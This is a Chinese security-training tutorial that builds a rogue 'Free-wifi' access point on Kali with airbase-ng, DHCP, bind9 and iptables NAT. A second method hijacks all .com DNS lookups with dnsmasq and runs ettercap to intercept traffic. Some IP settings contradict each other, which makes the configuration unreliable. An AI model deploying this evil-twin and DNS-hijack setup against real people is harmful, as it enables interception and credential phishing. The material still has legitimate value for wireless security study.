## 系列文章

> [专辑：渗透测试之地基篇](https://www.freebuf.com/column/1998)

## 简介

 **渗透测试-地基篇**

该篇章目的是重新牢固地基，加强每日训练操作的笔记，在记录地基笔记中会有很多跳跃性思维的操作和方式方法，望大家能共同加油学到东西。

 **请注意** ：

> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

名言：

你对这行的兴趣，决定你在这行的成就！

## 一、前言

今天会讲解到无线攻防自搭建钓鱼Wifi中的：安装部署环境、无线网卡外接开启、开启钓鱼wifi-Free、添加和配置本地接口并配置、DHCP服务搭建、wireshark抓包检查+本地验证、搭建DNS服务、配置防火墙规则放行等等操作，如果连无线攻防都不会安装甚至渗透操作等，怎么拿下对方服务器？

## 二、自搭建钓鱼Wifi（方法一）

这里介绍无线攻防实战的另外一种新姿势，就是自己搭建钓鱼wifi针对用户进行的攻击，没有哪一个系统能扛得住社会工程学技术的入侵，主要用kali来搭建模拟环境，如果别的环境需要搭建原理方法一致。

### 1、安装部署环境

1）更新源+安装钓鱼部署环境包

    
    
    apt-get update
    apt install bind9
    apt-get install isc-dhcp-server
    

![1649488412_6251321c45eedf7bcee1a.png!small?1649488423919](https://image.3001.net/images/20220409/1649488412_6251321c45eedf7bcee1a.png!small?1649488423919)![1649488416_6251322001e2902363eda.png!small?1649488423919](https://image.3001.net/images/20220409/1649488416_6251322001e2902363eda.png!small?1649488423919)![1649488419_6251322360d269a1748db.png!small?1649488426609](https://image.3001.net/images/20220409/1649488419_6251322360d269a1748db.png!small?1649488426609)  
成功完成安装！

### 2、无线网卡外接开启

这里需要连接两个外接无线网卡，除非自身本地是kali系统，外接一个无线网卡即可！插上两张无线网卡后会显示wlan0和wlan1...

1）首先开启无线网卡：

    
    
    airmon-ng start wlan0
    iwconfig
    

![1649488423_62513227ec9e1d84ccdb6.png!small?1649488426609](https://image.3001.net/images/20220409/1649488423_62513227ec9e1d84ccdb6.png!small?1649488426609)

![1649488428_6251322c1fbe6bcf01a55.png!small?1649488428992](https://image.3001.net/images/20220409/1649488428_6251322c1fbe6bcf01a55.png!small?1649488428992)  
这里wlan0激活后未wlan0mon监听模式：Monitor  
wlan1为接收模式：Managed

2）设置静态wlan0地址

    
    
    vi /etc/network/interfaces
    
    auto wlan1
    iface wlan1 inet static
    address 192.168.150.222
    netmask 255.255.255.0
    gateway 192.168.150.1
    

![1649488433_6251323171a599765480d.png!small?1649488434499](https://image.3001.net/images/20220409/1649488433_6251323171a599765480d.png!small?1649488434499)

给wlan1配置完成静态IP地址，需要重启网卡！

3）开启静态接口地址

    
    
    service networking restart
    

![1649488438_625132368ada731c4ebb3.png!small?1649488441263](https://image.3001.net/images/20220409/1649488438_625132368ada731c4ebb3.png!small?1649488441263)  
成功启动静态wlan1网卡！

### 3、开启钓鱼wifi-Free

开启免费信号，使用wlan0mon开启免费wifi进行钓鱼：

    
    
    airbase-ng -e "Free-wifi" -c 6 wlan0mon
    

![1649488442_6251323a88cf7a444168e.png!small?1649488443845](https://image.3001.net/images/20220409/1649488442_6251323a88cf7a444168e.png!small?1649488443845)

成功利用wlan0mon开启钓鱼wifi名称为：Free-wifi，外置的wifi信号可以发现我们刚开启的!

### 4、添加和配置本地接口并配置

现在只是钓鱼信号发送出来了，需要一个静态的地址给到内置的相应模块上面。

1）开启本地接口at0

    
    
    ifconfig at0 up
    ifconfig at0
    

![1649488447_6251323fe4c4075d2d12a.png!small?1649488448688](https://image.3001.net/images/20220409/1649488447_6251323fe4c4075d2d12a.png!small?1649488448688)

2）内置无线模块的接口配置IP：at0

    
    
    vi /etc/network/interfaces
    
    auto at0
    iface at0 inet static
    address 192.168.1.1
    netmask 255.255.255.0
    

![1649488452_62513244c6ab737851b1a.png!small?1649488453472](https://image.3001.net/images/20220409/1649488452_62513244c6ab737851b1a.png!small?1649488453472)  
保存即可，网关地址配置完成！

3）刷新网络服务

    
    
    service networking restart
    

![1649488456_62513248eb03f02d30132.png!small?1649488457820](https://image.3001.net/images/20220409/1649488456_62513248eb03f02d30132.png!small?1649488457820)  
成功分配地址给at0网卡！

### 5、DHCP服务搭建

目前钓鱼wifi这边已经有了网关地址，但是客户端还无法获得相关的dhcp类似的地址，需要搭建服务！环境bing9和dhcp已经在前面环境安装部署好了...开始！

1）配置钓鱼wifi子网信息

配置dhcpd.conf文件

    
    
    cd /etc/dhcp
    

![1649488462_6251324ee6773f1a539ac.png!small?1649488463306](https://image.3001.net/images/20220409/1649488462_6251324ee6773f1a539ac.png!small?1649488463306)  
可以看到存在dhcpd.conf，接下来就配置该文件即可！

    
    
    vi dhcpd.conf
    
    subnet 192.168.1.0 netmask 255.255.255.0 {
      range 192.168.1.100 192.168.1.150;
      option routers 192.168.1.1;
      option subnet-mask 255.255.255.0;
      option domain-name-servers 192.168.150.222;
    }
    

![1649488470_6251325606b1b73e3f7ee.png!small?1649488472171](https://image.3001.net/images/20220409/1649488470_6251325606b1b73e3f7ee.png!small?1649488472171)  
目前完成了子网的配置，192.168.10.10会用来搭建DNS缓存服务器！

2）开启服务监听at0

    
    
    vi /etc/default/isc-dhcp-server
    

![1649488475_6251325b1311c0cf81699.png!small?1649488475974](https://image.3001.net/images/20220409/1649488475_6251325b1311c0cf81699.png!small?1649488475974)

    
    
    service isc-dhcp-server start
    

![1649488478_6251325eb7f6c12fbbbc4.png!small?1649488479380](https://image.3001.net/images/20220409/1649488478_6251325eb7f6c12fbbbc4.png!small?1649488479380)  
成功开启！

 **3）如果遇到错误如何排查！！**  
![1649488482_62513262f1967ca62f014.png!small?1649488483564](https://image.3001.net/images/20220409/1649488482_62513262f1967ca62f014.png!small?1649488483564)  
报错了，分析下错误！

    
    
    journalctl -xe 
    

![1649488487_6251326793a397861d685.png!small?1649488494627](https://image.3001.net/images/20220409/1649488487_6251326793a397861d685.png!small?1649488494627)  
查看保存记录，配置文件配置错误！  
![1649488491_6251326b2310d7e6ba449.png!small?1649488494627](https://image.3001.net/images/20220409/1649488491_6251326b2310d7e6ba449.png!small?1649488494627)  
重新配置下该处即可！

![1649488496_6251327062dc32e87368d.png!small?1649488498314](https://image.3001.net/images/20220409/1649488496_6251327062dc32e87368d.png!small?1649488498314)  
成功开启！

4）或者查看端口是否开启：

    
    
    netstat -ntulp |grep 67
    

![1649488500_6251327449666fe5028c2.png!small?1649488500721](https://image.3001.net/images/20220409/1649488500_6251327449666fe5028c2.png!small?1649488500721)  
DHCP开启的是67端口...

### 6、wireshark抓包检查+本地验证

开启wireshark监听eth1接口：

![1649488504_62513278b83f906bf7127.png!small?1649488505155](https://image.3001.net/images/20220409/1649488504_62513278b83f906bf7127.png!small?1649488505155)

![1649488509_6251327d0a4d4630a9573.png!small?1649488521571](https://image.3001.net/images/20220409/1649488509_6251327d0a4d4630a9573.png!small?1649488521571)  
可看到握手包流量也已经有了！

![1649488513_625132811b2151c4422d4.png!small?1649488521571](https://image.3001.net/images/20220409/1649488513_625132811b2151c4422d4.png!small?1649488521571)  
手机链接wifi后也可以看到IP、网关、DNS都是对的！

### 7、kali-搭建DNS服务

    
    
    https://www.jianshu.com/p/bf3f7011b9fe
    

目前DNS已经指向我们，我们目前没有DNS服务，需要搭建，首先一定要安装好bind9环境，然后进入目录查看下底层详细信息。

1）了解底层文件

    
    
    cd /etc/bind
    

![1649488519_625132874e865cb91aa45.png!small?1649488521571](https://image.3001.net/images/20220409/1649488519_625132874e865cb91aa45.png!small?1649488521571)

查看主配置文件：  
![1649488523_6251328bc839260d9b797.png!small?1649488524571](https://image.3001.net/images/20220409/1649488523_6251328bc839260d9b797.png!small?1649488524571)  
可看到全局文件都将各个配置文件分散开进行配置的！

2）配置DNS全局配置文件

    
    
    vi named.conf.options
    

![1649488528_625132908225d97c998a6.png!small?1649488530539](https://image.3001.net/images/20220409/1649488528_625132908225d97c998a6.png!small?1649488530539)

需要配置参数：

    
    
    vi named.conf.options
    
    	forwarders { 8.8.8.8; };
    	recursion	yes;
    	allow-query { any; };
    	listen-on { any; };
    	listen-on port 53 { 192.168.10.10; };
    

![1649488534_6251329662622fd74e4e0.png!small?1649488537535](https://image.3001.net/images/20220409/1649488534_6251329662622fd74e4e0.png!small?1649488537535)

注意空格！这里图片有个错误的，就是{}括号问题！修改即可！

    
    
    代理到google的DNS服务器，
    允许转发的范围any
    监听范围any
    监听的端口 53
    

3）重启服务bind9

    
    
    service named restart
    service named status
    

![1649488539_6251329b5152ce8b2b54e.png!small?1649488544041](https://image.3001.net/images/20220409/1649488539_6251329b5152ce8b2b54e.png!small?1649488544041)

4）nslookup检测

    
    
    apt-get install dnsutils
    

如果无nslookup手动安装即可！  
![1649488543_6251329f662f5ccd73e64.png!small?1649488544042](https://image.3001.net/images/20220409/1649488543_6251329f662f5ccd73e64.png!small?1649488544042)  
可看到server为：192.168.253.1，为本机默认的DNS的IP，需要更高下即可！

5）更高本机DNS

    
    
    vi /etc/resolv.conf 
    

![1649488548_625132a43838180489b67.png!small?1649488548807](https://image.3001.net/images/20220409/1649488548_625132a43838180489b67.png!small?1649488548807)  
将192.168.253.1更改为192.168.10.10即可！

6）重启网络服务

    
    
    service networking restart
    

![1649488553_625132a9f211f49cd9ae4.png!small?1649488554327](https://image.3001.net/images/20220409/1649488553_625132a9f211f49cd9ae4.png!small?1649488554327)  
重启后开启防火墙规则！

7）开启防火墙规则

    
    
    echo 1 > /proc/sys/net/ipv4/ip_forward
    

![1649488556_625132acf39b038275f11.png!small?1649488557419](https://image.3001.net/images/20220409/1649488556_625132acf39b038275f11.png!small?1649488557419)

    
    
    iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o wlan1 -j SNAT --to-source 192.168.10.10
    

![1649488560_625132b0e026fa78f3d03.png!small?1649488562482](https://image.3001.net/images/20220409/1649488560_625132b0e026fa78f3d03.png!small?1649488562482)  
到此wifi就能顺利连接进入进行监视钓鱼！

## 三、Kali自搭建钓鱼（方法二）

### 1、安装部署环境

更新源+安装钓鱼部署环境包

    
    
    apt-get update
    apt install dnsmasq
    apt-get install isc-dhcp-server
    

![1649488565_625132b58d216ebaf247f.png!small?1649488567882](https://image.3001.net/images/20220409/1649488565_625132b58d216ebaf247f.png!small?1649488567882)

### 2、无线网卡外接开启

1）连接无线网卡

![1649488569_625132b9d4889069a870a.png!small?1649488570295](https://image.3001.net/images/20220409/1649488569_625132b9d4889069a870a.png!small?1649488570295)

![1649488573_625132bd650c65703aae2.png!small?1649488574070](https://image.3001.net/images/20220409/1649488573_625132bd650c65703aae2.png!small?1649488574070)  
可看到wlan0已经成功接入kali

2）开启wlan0无线网卡

    
    
    airmon-ng start wlan0
    

![1649488578_625132c29b374c4bb3b38.png!small?1649488580702](https://image.3001.net/images/20220409/1649488578_625132c29b374c4bb3b38.png!small?1649488580702)  
成功开启wlan0无线网卡，名称为:wlan0mon

### 3、添加虚拟网段网卡

    
    
    vi /etc/network/interfaces
    
    auto at0
    iface at0 inet static
    address 192.168.1.1
    netmask 255.255.255.0
    
    service networking restart
    

![1649488584_625132c86a35b82f831af.png!small?1649488585602](https://image.3001.net/images/20220409/1649488584_625132c86a35b82f831af.png!small?1649488585602)  
重新网卡后报错先不管！

### 4、开启钓鱼wifi

    
    
    airbase-ng -e Free-wifi -c 11 wlan0mon
    

![1649488588_625132ccd96f4e5fcbee9.png!small?1649488590760](https://image.3001.net/images/20220409/1649488588_625132ccd96f4e5fcbee9.png!small?1649488590760)

先创建个wifi此时wifi是无法连接上去的，因为DHCP和at0未配置!

### 5、配置DHCP和虚拟网卡

1）开启at0网卡，并重启服务

    
    
    ifconfig at0 up
    service networking restart
    

![1649488592_625132d0b9a728c4c97b9.png!small?1649488593665](https://image.3001.net/images/20220409/1649488592_625132d0b9a728c4c97b9.png!small?1649488593665)

2）配置DHCP

    
    
    vi /etc/dhcp/dhcpd.conf
    
    subnet 192.168.1.0 netmask 255.255.255.0{
    	range 192.168.1.101 192.168.1.150;
    	option routers 192.168.1.1;
    	option subnet-mask 255.255.255.0;
    	option domain-name-servers 192.168.253.150;
    }
    

![1649488597_625132d52b8236bf1d14d.png!small?1649488598504](https://image.3001.net/images/20220409/1649488597_625132d52b8236bf1d14d.png!small?1649488598504)

### 6、配置虚拟网卡信息

1）开启网段等配置信息

    
    
    ifconfig at0 up 192.168.1.1 netmask 255.255.255.0
    route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
    
    service networking restart
    

![1649488602_625132dacd0794ca4c4de.png!small?1649488603860](https://image.3001.net/images/20220409/1649488602_625132dacd0794ca4c4de.png!small?1649488603860)  
查看开启状态：

    
    
    service networking status
    

![1649488606_625132deb067f5391a40b.png!small?1649488607464](https://image.3001.net/images/20220409/1649488606_625132deb067f5391a40b.png!small?1649488607464)  
成功开启！

2）开启服务监听at0

    
    
    vi /etc/default/isc-dhcp-server
    

![1649488612_625132e40e9d2dc1d8329.png!small?1649488613373](https://image.3001.net/images/20220409/1649488612_625132e40e9d2dc1d8329.png!small?1649488613373)

    
    
    service isc-dhcp-server start
    

![1649488616_625132e80e50db84251b5.png!small?1649488616475](https://image.3001.net/images/20220409/1649488616_625132e80e50db84251b5.png!small?1649488616475)  
成功开启！  
![1649488620_625132ec26675c01be686.png!small?1649488620752](https://image.3001.net/images/20220409/1649488620_625132ec26675c01be686.png!small?1649488620752)

### 7、配置防火墙规则放行

    
    
    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -j SNAT --to 192.168.253.150
    

![1649488626_625132f2433087a0f0206.png!small?1649488626707](https://image.3001.net/images/20220409/1649488626_625132f2433087a0f0206.png!small?1649488626707)

再次检测，此时钓鱼wifi已经可以上网了！

### 8、DNS劫持

1）配置DNS劫持

    
    
    vi /etc/dnsmasq.conf
    
    resolv-file=/etc/resolv.conf
    strict-order
    listen-address=192.168.253.150
    address=/.com/192.168.253.150
    server=8.8.8.8
    server=114.114.114.114
    

![1649488631_625132f78fe165e23acc8.png!small?1649488632469](https://image.3001.net/images/20220409/1649488631_625132f78fe165e23acc8.png!small?1649488632469)

劫持所有.com的域名！

2）将eth0配置为dns

    
    
    auto eth0
    iface eth0 inet static
    address 192.168.253.150
    netmask 255.255.255.0
    gateway 192.168.253.1
    

![1649488637_625132fd7d826c534a5fa.png!small?1649488638691](https://image.3001.net/images/20220409/1649488637_625132fd7d826c534a5fa.png!small?1649488638691)

3）启用DNSmasq

Dnsmasq 提供 DNS 缓存和 DHCP 服务功能。作为域名解析服务器(DNS)，dnsmasq可以通过缓存 DNS
请求来提高对访问过的网址的连接速度。作为DHCP 服务器，dnsmasq
可以用于为局域网电脑分配内网ip地址和提供路由。DNS和DHCP两个功能可以同时或分别单独实现。dnsmasq轻量且易配置，适用于个人用户或少于50台主机的网络。此外它还自带了一个
PXE 服务器。

    
    
    service dnsmasq start 
    ettercap -Tq -i at0
    

dnsmasq轻量且易配置，适用于个人用户或少于50台主机的网络，按照命令开启即可！

## 四、总结

今天学到无线攻防自搭建钓鱼Wifi中的：安装部署环境、无线网卡外接开启、开启钓鱼wifi-Free、添加和配置本地接口并配置、DHCP服务搭建、wireshark抓包检查+本地验证、搭建DNS服务、配置防火墙规则放行等等操作，学到了非常多的小技巧和干货，希望小伙伴能实际操作复现一遍！来巩固告知企业单位的漏洞情况，并尽快进行加固巩固安全！

    
    
    服务攻防之数据库Mysql（上）-> 服务攻防之数据库Mysql（下）-> 服务攻防之数据库MSSQL（上）-> 服务攻防之数据库MSSQL（中）-> 服务攻防之数据库MSSQL（下）-> 服务攻防之数据库Oracle（上）-> 服务攻防之数据库Oracle（下）-> 服务攻防之数据库Redis（上）-> 服务攻防之数据库Redis（下）-> 服务攻防之数据库Mongodb（上）-> 服务攻防之数据库Mongodb（下）-> 服务攻防之中间件IIS（上）-> 服务攻防之中间件IIS（下）-> 服务攻防之中间件Apache（总）-> 服务攻防之中间件Nginx（总）-> 服务攻防之中间件Tomcat（上）-> 服务攻防之中间件Tomcat（下）-> 服务攻防之中间件JBoss（上）-> 服务攻防之中间件JBoss（中）-> 服务攻防之中间件JBoss（下）-> 服务攻防之中间件Weblogic（上）-> 服务攻防之中间件Weblogic（下）-> 服务攻防之中间件GlassFish（总）-> 服务攻防之中间件WebSphere（总）-> 服务攻防之框架Struts2（上）-> 服务攻防之框架Struts2（下）-> 服务攻防之框架Thinkphp（总）-> 服务攻防之框架Shiro（总）-> 服务攻防之框架Spring（上）-> 服务攻防之框架Spring（下）-> 服务攻防之框架FastJson（上）-> 服务攻防之框架FastJson（下）-> 无线攻防之Wifi破解（上）-> 无线攻防之Wifi破解（下）-> 无线攻防之Kali自搭建钓鱼Wifi（总）......
    

接下来在《无线攻防之钓鱼无线攻击（上）》会接触到wifiphisher钓鱼中：wifiphisher简介、wifiphisher钓鱼详解、多功能钓鱼页面详解、自定义钓鱼、另类钓鱼用法，以及wifiphisher分析底层文件中判断屏幕大小、判断浏览器类型、判断系统内容、加载Mac代码、加载windows代码、加载的安卓和ios代码等渗透操作，如何提权渗透等方法，请看下篇无线攻防之钓鱼无线攻击（上）篇章！

希望大家提高安全意识，没有网络安全就没有国家安全！

今天基础牢固就到这里，虽然基础，但是必须牢记于心。

作者：大余

